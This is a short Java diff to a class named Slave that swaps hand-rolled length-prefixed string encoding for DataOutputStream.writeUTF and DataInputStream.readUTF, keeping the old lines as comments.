@@ -200,8 +200,9 @@ public class Slave extends CustomStream implements Runnable {
 				enc = "-c " + s;
 			}
 
-			dos.writeShort(enc.length());
-			dos.writeChars(enc);
+			dos.writeUTF(enc);
+			//dos.writeShort(enc.length());
+			//dos.writeChars(enc);
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
@@ -209,14 +210,15 @@ public class Slave extends CustomStream implements Runnable {
 
 	@Override
 	public String readLine() throws Exception {
-		short len = dis.readShort();
+		String s = dis.readUTF();
+		/*short len = dis.readShort();
 
 		StringBuilder builder = new StringBuilder();
 		for (int i = 0; i < len; i++) {
 			builder.append(dis.readChar());
 		}
 
-		String s = builder.toString();
+		String s = builder.toString();*/
 
 		if (s.startsWith("-h ")) {
 			s = Hex.decode(s.substring(3, s.length()));
